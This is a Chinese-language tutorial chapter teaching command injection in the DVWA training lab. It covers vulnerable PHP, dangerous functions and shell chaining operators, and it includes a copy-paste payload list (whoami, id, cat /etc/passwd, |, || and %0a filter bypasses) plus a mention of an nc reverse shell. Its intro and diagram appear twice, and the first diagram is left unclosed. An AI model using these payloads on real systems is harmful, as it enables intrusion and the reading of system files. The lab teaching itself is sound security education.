# 第6章 DVWA实战：命令注入漏洞（Command Injection）

哈喽小伙伴们，咱们又见面啦！上一章咱们学习了暴力破解，是不是感觉挺有意思的？今天咱们来学习一个更厉害、更危险的漏洞——**命令注入漏洞**！

为什么说它更危险呢？因为暴力破解最多也就是猜到个密码，而命令注入一旦成功，**黑客就相当于直接坐在服务器旁边敲CMD了**！想干啥干啥，服务器基本上就归他了。你说吓人不吓人？😱

那命令注入到底是啥？它为什么这么厉害？咱们又该怎么防御呢？别着急，今天这一章，我就用大白话给你讲得明明白白的，而且咱们还会在DVWA里亲手实操，从Low级别一路打到Impossible级别，让你彻底搞懂命令注入！

坐稳扶好，咱们出发！🚀

---

## 6.1 什么是命令注入？

### 6.1.1 大白话解释命令注入

首先问大家一个问题：你们平时用电脑的时候，有没有打开过CMD（命令提示符）或者终端？比如敲个 `ipconfig` 看看IP地址，敲个 `whoami` 看看当前用户名，敲个 `dir` 看看文件列表之类的。

如果你用过，那理解命令注入就很简单了。

**命令注入，大白话讲就是：黑客通过网页上的输入框，让服务器去执行系统命令，就像黑客亲自坐在服务器旁边敲CMD一样！**

啥意思呢？就是说，本来网站只是让你输入个IP地址、用户名啥的，结果黑客在输入框里写了一些"坏东西"，服务器没检查，直接把这些"坏东西"当成系统命令去执行了。

这就麻烦大了！因为系统命令能做的事情太多了——看文件、删数据、加用户、开远程桌面……基本上你在CMD里能干的事，黑客都能干。

### 6.1.2 生活例子理解命令注入

光说概念可能还是有点抽象，给大家举个生活中的例子，一下子就懂了！🍜

想象一下，你去一家餐厅吃饭。这家餐厅有个规矩：你告诉服务员你想吃什么菜，服务员就把菜名告诉厨房，厨房就给你做。

正常情况是这样的：
- 你说："来份鱼香肉丝"
- 服务员转告厨房："做鱼香肉丝"
- 厨房做了鱼香肉丝，端给你

这没问题，对吧？

但是呢，如果你是个"坏人"，你说：
- **"来份鱼香肉丝，顺便把厨房的菜刀拿来给我"**

这时候，如果服务员是个老实人，脑子不转弯，不加思考就把你整句话都传给厨房了，那会发生什么？

厨房一听："哦，客人要鱼香肉丝，还要菜刀"，然后就真的把鱼香肉丝和菜刀一起给你拿出来了！

你拿到菜刀之后，想干啥就干啥了——可以抢钱，可以劫持人质，可以……（此处省略一万字）

这就出大事了！

**命令注入就是这么回事：** 你在输入框里输入的内容里夹带了"私货"（系统命令），服务器（就像那个老实的服务员）没检查，把你的"私货"也当成命令执行了，然后黑客就拿到了服务器的控制权！

是不是一下子就懂了？😏

### 6.1.3 为什么会有命令注入漏洞？

那小伙伴们可能会问：为啥服务器这么傻？用户输入啥就执行啥？程序员就不知道检查一下吗？

问得好！命令注入漏洞产生的根本原因就是：**程序员把用户输入的内容，直接拼接到系统命令里去执行了，而且没有做任何过滤或者过滤不严格！**

举个例子，很多网站都有个"ping一下看看服务器通不通"的功能，你输入一个IP地址，网站就帮你ping一下，告诉你能不能通。

这个功能的后台代码（PHP为例）大概是这样的：

```php
<?php
    $ip = $_GET['ip'];  // 从用户输入里拿到IP地址
    $cmd = "ping " . $ip;  // 把IP拼到ping命令后面
    $result = shell_exec($cmd);  // 执行命令
    echo $result;  // 输出结果
?>
```

看到问题了吗？用户输入的 `$ip` 直接就拼到命令里了！啥检查都没做！

那如果用户输入的不是IP地址，而是 `127.0.0.1 && whoami` 呢？

拼出来的命令就变成了：`ping 127.0.0.1 && whoami`

服务器一执行，不仅ping了，还把 `whoami` 也执行了！这就是命令注入！

所以你看，漏洞的根源就是：**不信任用户输入，但是又不做过滤，直接拼接执行！**

### 6.1.4 常见的危险函数

在不同的编程语言里，执行系统命令的函数不一样。咱们以PHP为例（因为DVWA是用PHP写的），常见的危险函数有这么几个：

| 函数名 | 作用 | 简单说明 |
|--------|------|----------|
| `system()` | 执行命令并输出结果 | 直接把命令结果打印出来 |
| `exec()` | 执行命令，返回最后一行结果 | 只返回最后一行，需要自己输出 |
| `shell_exec()` | 执行命令，返回全部输出 | 返回完整的结果字符串 |
| `passthru()` | 执行命令并直接输出原始结果 | 适合输出二进制数据 |
| `popen()` | 打开进程文件指针 | 可以读也可以写，比较灵活 |
| `proc_open()` | 执行命令，更复杂的进程控制 | 功能最强大，也最复杂 |

大家不用死记硬背，知道有这么个东西就行。反正记住：**只要是能执行系统命令的函数，如果用户输入能影响到命令的内容，就可能产生命令注入漏洞。**

不光是PHP，其他语言也一样：
- Python里的 `os.system()`、`os.popen()`、`subprocess` 模块
- Java里的 `Runtime.getRuntime().exec()`
- C语言里的 `system()`

……只要是能执行系统命令的地方，都要小心！

### 📍 先看你该访问哪个 URL（三选一）

**本章靶场模块：Command Injection**（帮你 ping IP 的那个功能）。左边栏点 Command Injection 进入。

| 搭建方式 | 本章页面地址 | 攻击机常用命令（Kali 原生 LAMP 下最香）|
|---|---|---|
| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/exec/` | 输入框填 `127.0.0.1 & ipconfig` |
| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/exec/` | 输入框填 `127.0.0.1; whoami; id; uname -a`；Kali 终端 nc 反弹 shell |
| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/exec/`（无 /dvwa 这层）| 同 Kali；不过容器里一般没有 nc，改试 `127.0.0.1 | ls -la /var/www/`（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|

<svg viewBox="0 0 1100 430" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">

  <defs><linearGradient id="ci1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#f0883e"/><stop offset="100%" stop-color="#823a0b"/></linearGradient><linearGradient id="ci2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#a371f7"/><stop offset="100%" stop-color="#3b1e79"/></linearGradient><marker id="cir" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f0883e"/></marker></defs>
  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 6-1  命令注入 · 8 种连接符链式攻击流程图</text>
  <!-- 左：用户输入框 -->
  <rect x="20" y="64" width="250" height="340" rx="14" fill="url(#ci1)" stroke="#ffa657" stroke-width="1.4"/>
  <text x="145" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">📝  浏览器输入框（填 IP 的地方）</text>
  <g font-family="Arial" font-size="13" fill="#fff5e6">
    <text x="38" y="136">正常输入（白用户 👤）：</text>
    <rect x="38" y="148" width="214" height="36" rx="6" fill="#000" opacity="0.35"/>
    <text x="50" y="172">8.8.8.8</text>
    <text x="38" y="226">恶意输入（黑帽子 🎩）：</text>
    <rect x="38" y="238" width="214" height="36" rx="6" fill="#000" opacity="0.45"/>
    <text x="50" y="262" fill="#ffd089">127.0.0.1; whoami; id; cat /etc/passwd</text>
    <text x="38" y="310">⬇️  点击 Submit，提交到后端</text>
    <text x="38" y="328">⬇️  PHP 不做任何过滤（Low）</text>
    <text x="38" y="346">⬇️  直接拼进 shell_exec()</text>
    <text x="38" y="364">⬇️  把结果 echo 回页面 ✅</text>
  </g>
  <!-- 中：连接符 8 宫格 -->
  <rect x="290" y="64" width="520" height="340" rx="14" fill="#0f1630" stroke="#a371f7" stroke-width="1.2"/>
  <text x="550" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="17">🔗  命令连接符 · 8 种经典拼接（背下来 ✨）</text>
  <g font-family="Arial" font-size="13">
    <g transform="translate(310,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&amp;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前后都执行（不管成败）</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">1 &amp; 2 必跑俩</text>
    </g>
    <g transform="translate(442,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&amp;&amp;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前成功 才执行后</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">1 成功 → 执行 2</text>
    </g>
    <g transform="translate(574,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&#124;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前输出 当后输入</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">whoami &#124; base64</text>
    </g>
    <g transform="translate(706,120)">
      <rect width="80" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="40" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&#124;&#124;</text><text x="40" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前失败 才执行后</text><text x="40" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">ping x &#124;&#124; whoami</text>
    </g>
    <g transform="translate(310,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">Linux 专属分隔</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">Kali/Mac 都吃 🔥</text>
    </g>
    <g transform="translate(442,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">%0a 换行</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">URL编码换行</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">绕过对;的过滤</text>
    </g>
    <g transform="translate(574,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">$()</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">命令替换（Linux）</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">echo $(whoami)</text>
    </g>
    <g transform="translate(706,204)">
      <rect width="80" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="40" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">`` 反引号</text><text x="40" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">同 $() 老写法</text><text x="40" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">echo `id`</text>
    </g>
    <text x="550" y="314" text-anchor="middle" fill="#ffd089" font-weight="bold" font-size="14">📌  Low 级别：以上 8 种全能打；Medium 只杀 &amp;&amp; 和 ; → 换 &#124; 或 %0a 绕过；High 黑名单长但常漏 &#124;&#124; 反引号</text>
    <text x="550" y="340" text-anchor="middle" fill="#a371f7" font-weight="bold">📌  IMPOSSIBLE 只允许白名单输入（纯 IPv4 正则），以上全灭，真安全写法 ✅</text>
    <text x="550" y="368" text-anchor="middle" fill="#c9d3eb">👉 实战 payload 示例：</text>
    <text x="550" y="390" text-anchor="middle" font-family="Consolas,monospace" fill="#d5b8ff">127.0.0.1 &#124; cat /etc/passwd &#124; head -5</text>
  </g>
  <!-- 右：输出结果 -->
  <rect x="830" y="64" width="250" height="340" rx="14" fill="url(#ci2)" stroke="#a371f7" stroke-width="1.4"/>
  <text x="955" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">📺  浏览器回显（结果直接看见）</text>
  <g font-family="Consolas,monospace" font-size="11.5" fill="#efe5ff">
    <rect x="848" y="124" width="214" height="262" rx="8" fill="#000" opacity="0.55"/>
    <text x="862" y="150" fill="#9de8b0"># ping 127.0.0.1 输出</text>
    <text x="862" y="168">PING 127.0.0.1: 56 data bytes</text>
    <text x="862" y="186">64 bytes from 127.0.0.1: time=0.02ms</text>
    <text x="862" y="204">...</text>
    <text x="862" y="224" fill="#ffd700"># whoami 输出 ✅</text>
    <text x="862" y="242">www-data</text>
    <text x="862" y="262" fill="#ffd700"># id 输出 ✅</text>
    <text x="862" y="280">uid=33(www-data) gid=33 ...</text>
    <text x="862" y="300" fill="#ffd700"># cat /etc/passwd ✅</text>
    <text x="862" y="318">root:x:0:0:root:/root:/bin/bash</text>
    <text x="862" y="336">daemon:x:1:1:daemon:/usr/sbin:/...</text>
    <text x="862" y="354">mysql:x:999:999::/home/mysql:..</text>
    <text x="862" y="374" fill="#3fb950" font-weight="bold">🎯 完美拿到服务器信息！</text>
  </g>
# 第6章 DVWA实战：命令注入漏洞（Command Injection）

哈喽小伙伴们，咱们又见面啦！上一章咱们学习了暴力破解，是不是感觉挺有意思的？今天咱们来学习一个更厉害、更危险的漏洞——**命令注入漏洞**！

为什么说它更危险呢？因为暴力破解最多也就是猜到个密码，而命令注入一旦成功，**黑客就相当于直接坐在服务器旁边敲CMD了**！想干啥干啥，服务器基本上就归他了。你说吓人不吓人？😱

那命令注入到底是啥？它为什么这么厉害？咱们又该怎么防御呢？别着急，今天这一章，我就用大白话给你讲得明明白白的，而且咱们还会在DVWA里亲手实操，从Low级别一路打到Impossible级别，让你彻底搞懂命令注入！

坐稳扶好，咱们出发！🚀

---

## 6.1 什么是命令注入？

### 6.1.1 大白话解释命令注入

首先问大家一个问题：你们平时用电脑的时候，有没有打开过CMD（命令提示符）或者终端？比如敲个 `ipconfig` 看看IP地址，敲个 `whoami` 看看当前用户名，敲个 `dir` 看看文件列表之类的。

如果你用过，那理解命令注入就很简单了。

**命令注入，大白话讲就是：黑客通过网页上的输入框，让服务器去执行系统命令，就像黑客亲自坐在服务器旁边敲CMD一样！**

啥意思呢？就是说，本来网站只是让你输入个IP地址、用户名啥的，结果黑客在输入框里写了一些"坏东西"，服务器没检查，直接把这些"坏东西"当成系统命令去执行了。

这就麻烦大了！因为系统命令能做的事情太多了——看文件、删数据、加用户、开远程桌面……基本上你在CMD里能干的事，黑客都能干。

### 6.1.2 生活例子理解命令注入

光说概念可能还是有点抽象，给大家举个生活中的例子，一下子就懂了！🍜

想象一下，你去一家餐厅吃饭。这家餐厅有个规矩：你告诉服务员你想吃什么菜，服务员就把菜名告诉厨房，厨房就给你做。

正常情况是这样的：
- 你说："来份鱼香肉丝"
- 服务员转告厨房："做鱼香肉丝"
- 厨房做了鱼香肉丝，端给你

这没问题，对吧？

但是呢，如果你是个"坏人"，你说：
- **"来份鱼香肉丝，顺便把厨房的菜刀拿来给我"**

这时候，如果服务员是个老实人，脑子不转弯，不加思考就把你整句话都传给厨房了，那会发生什么？

厨房一听："哦，客人要鱼香肉丝，还要菜刀"，然后就真的把鱼香肉丝和菜刀一起给你拿出来了！

你拿到菜刀之后，想干啥就干啥了——可以抢钱，可以劫持人质，可以……（此处省略一万字）

这就出大事了！

**命令注入就是这么回事：** 你在输入框里输入的内容里夹带了"私货"（系统命令），服务器（就像那个老实的服务员）没检查，把你的"私货"也当成命令执行了，然后黑客就拿到了服务器的控制权！

是不是一下子就懂了？😏

### 6.1.3 为什么会有命令注入漏洞？

那小伙伴们可能会问：为啥服务器这么傻？用户输入啥就执行啥？程序员就不知道检查一下吗？

问得好！命令注入漏洞产生的根本原因就是：**程序员把用户输入的内容，直接拼接到系统命令里去执行了，而且没有做任何过滤或者过滤不严格！**

举个例子，很多网站都有个"ping一下看看服务器通不通"的功能，你输入一个IP地址，网站就帮你ping一下，告诉你能不能通。

这个功能的后台代码（PHP为例）大概是这样的：

```php
<?php
    $ip = $_GET['ip'];  // 从用户输入里拿到IP地址
    $cmd = "ping " . $ip;  // 把IP拼到ping命令后面
    $result = shell_exec($cmd);  // 执行命令
    echo $result;  // 输出结果
?>
```

看到问题了吗？用户输入的 `$ip` 直接就拼到命令里了！啥检查都没做！

那如果用户输入的不是IP地址，而是 `127.0.0.1 && whoami` 呢？

拼出来的命令就变成了：`ping 127.0.0.1 && whoami`

服务器一执行，不仅ping了，还把 `whoami` 也执行了！这就是命令注入！

所以你看，漏洞的根源就是：**不信任用户输入，但是又不做过滤，直接拼接执行！**

### 6.1.4 常见的危险函数

在不同的编程语言里，执行系统命令的函数不一样。咱们以PHP为例（因为DVWA是用PHP写的），常见的危险函数有这么几个：

| 函数名 | 作用 | 简单说明 |
|--------|------|----------|
| `system()` | 执行命令并输出结果 | 直接把命令结果打印出来 |
| `exec()` | 执行命令，返回最后一行结果 | 只返回最后一行，需要自己输出 |
| `shell_exec()` | 执行命令，返回全部输出 | 返回完整的结果字符串 |
| `passthru()` | 执行命令并直接输出原始结果 | 适合输出二进制数据 |
| `popen()` | 打开进程文件指针 | 可以读也可以写，比较灵活 |
| `proc_open()` | 执行命令，更复杂的进程控制 | 功能最强大，也最复杂 |

大家不用死记硬背，知道有这么个东西就行。反正记住：**只要是能执行系统命令的函数，如果用户输入能影响到命令的内容，就可能产生命令注入漏洞。**

不光是PHP，其他语言也一样：
- Python里的 `os.system()`、`os.popen()`、`subprocess` 模块
- Java里的 `Runtime.getRuntime().exec()`
- C语言里的 `system()`

……只要是能执行系统命令的地方，都要小心！

### 📍 先看你该访问哪个 URL（三选一）

**本章靶场模块：Command Injection**（帮你 ping IP 的那个功能）。左边栏点 Command Injection 进入。

| 搭建方式 | 本章页面地址 | 攻击机常用命令（Kali 原生 LAMP 下最香）|
|---|---|---|
| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/exec/` | 输入框填 `127.0.0.1 & ipconfig` |
| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/exec/` | 输入框填 `127.0.0.1; whoami; id; uname -a`；Kali 终端 nc 反弹 shell |
| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/exec/`（无 /dvwa 这层）| 同 Kali；不过容器里一般没有 nc，改试 `127.0.0.1 | ls -la /var/www/`（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|

<svg viewBox="0 0 1100 430" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">

  <defs><linearGradient id="ci1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#f0883e"/><stop offset="100%" stop-color="#823a0b"/></linearGradient><linearGradient id="ci2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#a371f7"/><stop offset="100%" stop-color="#3b1e79"/></linearGradient><marker id="cir" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f0883e"/></marker></defs>
  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 6-1  命令注入 · 8 种连接符链式攻击流程图</text>
  <!-- 左：用户输入框 -->
  <rect x="20" y="64" width="250" height="340" rx="14" fill="url(#ci1)" stroke="#ffa657" stroke-width="1.4"/>
  <text x="145" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">📝  浏览器输入框（填 IP 的地方）</text>
  <g font-family="Arial" font-size="13" fill="#fff5e6">
    <text x="38" y="136">正常输入（白用户 👤）：</text>
    <rect x="38" y="148" width="214" height="36" rx="6" fill="#000" opacity="0.35"/>
    <text x="50" y="172">8.8.8.8</text>
    <text x="38" y="226">恶意输入（黑帽子 🎩）：</text>
    <rect x="38" y="238" width="214" height="36" rx="6" fill="#000" opacity="0.45"/>
    <text x="50" y="262" fill="#ffd089">127.0.0.1; whoami; id; cat /etc/passwd</text>
    <text x="38" y="310">⬇️  点击 Submit，提交到后端</text>
    <text x="38" y="328">⬇️  PHP 不做任何过滤（Low）</text>
    <text x="38" y="346">⬇️  直接拼进 shell_exec()</text>
    <text x="38" y="364">⬇️  把结果 echo 回页面 ✅</text>
  </g>
  <!-- 中：连接符 8 宫格 -->
  <rect x="290" y="64" width="520" height="340" rx="14" fill="#0f1630" stroke="#a371f7" stroke-width="1.2"/>
  <text x="550" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="17">🔗  命令连接符 · 8 种经典拼接（背下来 ✨）</text>
  <g font-family="Arial" font-size="13">
    <g transform="translate(310,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&amp;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前后都执行（不管成败）</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">1 &amp; 2 必跑俩</text>
    </g>
    <g transform="translate(442,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&amp;&amp;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前成功 才执行后</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">1 成功 → 执行 2</text>
    </g>
    <g transform="translate(574,120)">
      <rect width="112" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&#124;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前输出 当后输入</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">whoami &#124; base64</text>
    </g>
    <g transform="translate(706,120)">
      <rect width="80" height="64" rx="8" fill="#8957e525" stroke="#8957e5"/><text x="40" y="24" text-anchor="middle" font-weight="bold" fill="#d5b8ff">&#124;&#124;</text><text x="40" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">前失败 才执行后</text><text x="40" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">ping x &#124;&#124; whoami</text>
    </g>
    <g transform="translate(310,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">;</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">Linux 专属分隔</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">Kali/Mac 都吃 🔥</text>
    </g>
    <g transform="translate(442,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">%0a 换行</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">URL编码换行</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">绕过对;的过滤</text>
    </g>
    <g transform="translate(574,204)">
      <rect width="112" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="56" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">$()</text><text x="56" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">命令替换（Linux）</text><text x="56" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">echo $(whoami)</text>
    </g>
    <g transform="translate(706,204)">
      <rect width="80" height="64" rx="8" fill="#23863625" stroke="#238636"/><text x="40" y="24" text-anchor="middle" font-weight="bold" fill="#9de8b0">`` 反引号</text><text x="40" y="44" text-anchor="middle" font-size="11" fill="#c9d3eb">同 $() 老写法</text><text x="40" y="60" text-anchor="middle" font-size="11" fill="#c9d3eb">echo `id`</text>
    </g>
    <text x="550" y="314" text-anchor="middle" fill="#ffd089" font-weight="bold" font-size="14">📌  Low 级别：以上 8 种全能打；Medium 只杀 &amp;&amp; 和 ; → 换 &#124; 或 %0a 绕过；High 黑名单长但常漏 &#124;&#124; 反引号</text>
    <text x="550" y="340" text-anchor="middle" fill="#a371f7" font-weight="bold">📌  IMPOSSIBLE 只允许白名单输入（纯 IPv4 正则），以上全灭，真安全写法 ✅</text>
    <text x="550" y="368" text-anchor="middle" fill="#c9d3eb">👉 实战 payload 示例：</text>
    <text x="550" y="390" text-anchor="middle" font-family="Consolas,monospace" fill="#d5b8ff">127.0.0.1 &#124; cat /etc/passwd &#124; head -5</text>
  </g>
  <!-- 右：输出结果 -->
  <rect x="830" y="64" width="250" height="340" rx="14" fill="url(#ci2)" stroke="#a371f7" stroke-width="1.4"/>
  <text x="955" y="98" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">📺  浏览器回显（结果直接看见）</text>
  <g font-family="Consolas,monospace" font-size="11.5" fill="#efe5ff">
    <rect x="848" y="124" width="214" height="262" rx="8" fill="#000" opacity="0.55"/>
    <text x="862" y="150" fill="#9de8b0"># ping 127.0.0.1 输出</text>
    <text x="862" y="168">PING 127.0.0.1: 56 data bytes</text>
    <text x="862" y="186">64 bytes from 127.0.0.1: time=0.02ms</text>
    <text x="862" y="204">...</text>
    <text x="862" y="224" fill="#ffd700"># whoami 输出 ✅</text>
    <text x="862" y="242">www-data</text>
    <text x="862" y="262" fill="#ffd700"># id 输出 ✅</text>
    <text x="862" y="280">uid=33(www-data) gid=33 ...</text>
    <text x="862" y="300" fill="#ffd700"># cat /etc/passwd ✅</text>
    <text x="862" y="318">root:x:0:0:root:/root:/bin/bash</text>
    <text x="862" y="336">daemon:x:1:1:daemon:/usr/sbin:/...</text>
    <text x="862" y="354">mysql:x:999:999::/home/mysql:..</text>
    <text x="862" y="374" fill="#3fb950" font-weight="bold">🎯 完美拿到服务器信息！</text>
  </g>
</svg>

> 🔥 **Kali 同学本章速查 payload（复制粘贴进 DVWA 输入框）：**
> ```bash
> 127.0.0.1; whoami; id; uname -a; cat /etc/passwd | head -10        # Low 全显
> 127.0.0.1 | whoami | id | ls -la /var/www/html/dvwa/hackable/       # Medium 杀&&/;，用 | 绕过
> aaa || whoami || cat /etc/issue                                     # High 黑名单漏了 || 和反引号
> 127.0.0.1%0awhoami%0aid%0auname%20-a                               # Burp Repeater 里 URL编码换行
> ```

---

## 6.2 管道符/命令连接符详解（重点！）

在正式开始实战之前，咱们得先认识几个非常非常重要的"小伙伴"——**管道符和命令连接符**。

这些符号是干啥的呢？简单说，就是用来把多个命令拼接在一起的，就像连词一样，把几个句子串起来。

为什么要学这个？因为命令注入的核心，就是用这些符号把我们想执行的命令"接"在原来的命令后面，让服务器一起执行！

好，咱们一个一个来认识！🎯

### 6.2.1 & 符号（和）

**作用：** 前面的命令执行完，就执行后面的命令。不管前面的命令成功还是失败，后面的都会执行。

**格式：** `命令1 & 命令2`

**生活例子：** 
"写完作业 & 玩游戏"——不管作业写没写完（哪怕你写一半扔那儿了），反正写完那个动作之后，你就去玩游戏了。

**举个实际例子：**
`ping 127.0.0.1 & whoami`

执行结果就是：先执行ping，ping完了（不管通不通），再执行whoami。两个命令都会执行。

### 6.2.2 && 符号（双与/逻辑与）

**作用：** 前面的命令**成功**执行了，才会执行后面的命令。如果前面的命令失败了，后面的就不执行了。

**格式：** `命令1 && 命令2`

**生活例子：**
"考100分 && 买玩具"——必须考到100分（成功），才给买玩具。考不到（失败），就啥也别想了。

**举个实际例子：**
`ping 127.0.0.1 && whoami`

如果ping成功了（能通），就执行whoami；如果ping失败了（不通），whoami就不执行了。

### 6.2.3 | 符号（管道符）

**作用：** 把前面命令的**输出**，传给后面的命令当**输入**。

**格式：** `命令1 | 命令2`

**生活例子：**
"洗菜 | 切菜 | 炒菜 | 装盘"——洗菜的结果（洗干净的菜）传给切菜的，切完的菜传给炒菜的，炒完了装盘。前一个的输出，是后一个的输入。

**举个实际例子：**
`ping 127.0.0.1 | whoami`

哎？这个有点特殊啊。ping的输出传给whoami当输入？但是whoami好像不需要输入啊？那会怎么样？

哈哈，在命令注入里，我们经常这么用。虽然whoami不需要输入，但没关系，**管道符会让两个命令都执行**，只是后面的命令会忽略前面传过来的输入而已。结果就是——whoami照样执行！

所以在命令注入中，`|` 也经常被用来拼接命令，效果还挺好使的！😏

### 6.2.4 || 符号（或/逻辑或）

**作用：** 前面的命令**失败**了，才执行后面的命令。如果前面的命令成功了，后面的就不执行了。

**格式：** `命令1 || 命令2`

**生活例子：**
"下雨 || 去公园"——如果下雨（前面失败了，因为计划是去公园，下雨就去不成了），就不去公园了（执行后面的"不去公园"）。不下雨（前面成功了），就去公园，后面的不执行。

（这个例子可能有点绕，大家多想想就明白了。）

**举个实际例子：**
`ping 不存在的IP || whoami`

因为ping一个不存在的IP会失败，所以后面的whoami就会执行。

但如果ping的是127.0.0.1，ping成功了，那whoami就不执行了。

### 6.2.5 ; 符号（分号）

**作用：** 依次执行多个命令，用分号隔开。前面执行完就执行后面的，不管成功失败。

**格式：** `命令1; 命令2; 命令3`

**生活例子：**
"起床; 刷牙; 洗脸; 吃饭"——按顺序一个一个来，做完一件做下一件，不管前一件做得好不好。

**举个实际例子：**
`ping 127.0.0.1; whoami; dir`

先执行ping，再执行whoami，再执行dir，一个接一个。

**注意：** 分号这个符号，主要在 **Linux/Unix** 系统下常用。Windows的CMD里，分号一般不能这么用，Windows里用 `&` 多一些。

### 6.2.6 其他一些可能用到的符号

除了上面这几个最常用的，还有一些符号在某些情况下也可能用到，大家了解一下就行：

| 符号 | 作用 | 说明 |
|------|------|------|
| `|` | 管道符 | 前面说过了，最常用的之一 |
| `||` | 逻辑或 | 前面失败才执行后面 |
| `&&` | 逻辑与 | 前面成功才执行后面 |
| `&` | 后台执行/连接 | Windows下也可以当连接符用 |
| `;` | 命令分隔符 | Linux常用，Windows不常用 |
| `` ` `` | 反引号 | 命令替换，Linux下用，里面的命令先执行 |
| `$()` | 命令替换 | Linux下用，和反引号类似 |
| `%0a` | 换行符（URL编码） | 有些情况下可以用来分隔命令 |
| `%0d` | 回车符（URL编码） | 有时候也能用 |

